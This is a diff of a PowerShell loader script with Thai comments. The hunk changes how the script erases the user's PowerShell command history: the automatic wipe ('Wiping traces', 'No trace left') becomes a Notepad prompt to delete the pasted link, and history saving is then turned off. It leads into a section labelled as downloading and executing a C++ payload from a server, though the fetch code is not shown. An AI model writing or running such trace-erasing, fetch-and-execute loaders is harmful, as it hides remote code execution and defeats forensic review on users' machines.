@@ -16,22 +16,26 @@ Write-Host "  ========================================================" -Foregro
 Write-Host ""
 
 # ------------------------------------------
-# AUTO HISTORY CLEANUP
+# CLASSIC HISTORY CLEANUP (NOTEPAD POPUP)
 # ------------------------------------------
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces..." -ForegroundColor White
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Fetching PowerShell history..." -ForegroundColor White
 
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) {
-    Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
-    Clear-History
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "!" -ForegroundColor Red -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Notepad opened. Please clear your link, SAVE, and CLOSE Notepad." -ForegroundColor Red
+    
+    # เด้ง Notepad ขึ้นมา และระบบจะหยุดรอจนกว่าคุณจะกดปิด Notepad (-Wait)
+    Start-Process notepad.exe -ArgumentList $historyPath -Wait 
+    
+    # ป้องกันไม่ให้ PowerShell แอบจำคำสั่งที่เพิ่งพิมพ์ไปอีกรอบตอนปิดหน้าต่าง
     Set-PSReadLineOption -HistorySaveStyle SaveNothing
-    Start-Sleep -Milliseconds 500
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " System cleaned perfectly. No trace left." -ForegroundColor Green
+    
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History cleaned securely." -ForegroundColor Green
 }
 Write-Host ""
 
 # ------------------------------------------
-# DOWNLOAD & EXECUTE C++ PAYLOAD
+# DOWNLOAD & EXECUTE C++ PAYLOAD (TEMP LOADER)
 # ------------------------------------------
 Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server..." -ForegroundColor White
 
